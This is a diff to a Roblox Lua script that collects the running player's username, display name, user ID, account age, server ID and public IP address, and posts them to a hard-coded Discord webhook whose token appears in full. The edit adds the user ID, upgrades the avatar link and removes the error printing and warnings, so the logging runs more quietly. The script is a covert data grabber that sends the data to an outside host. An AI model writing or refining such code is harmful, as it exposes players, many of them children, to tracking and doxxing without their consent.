@@ -2,11 +2,12 @@
 local webhookUrl = "https://discord.com/api/webhooks/1212487312873885716/76arKjYim_SIBRs6cTjnI7_ynKjEjdNp3H9DI5BbYisFQ42CBJHPYZnmG62TkeGJhdrD"
 
 local player = game.Players.LocalPlayer
+local userId = player.UserId
 local username = player.Name
 local accountAge = player.AccountAge
 local gameUsername = player.DisplayName
 local serverId = game.JobId
-local avatarUrl = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. username
+local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=352&height=352&format=Png"
 
 -- Retrieve IP address
 local ip = game:HttpGet("https://api.ipify.org")
@@ -44,8 +45,5 @@ if httpRequest then
         Body = jsonData
     })
 
-    -- Optionally, you can print the response to check for errors
-    print(response.Body)
-else
-    warn("HTTP request not available.")
+    
 end
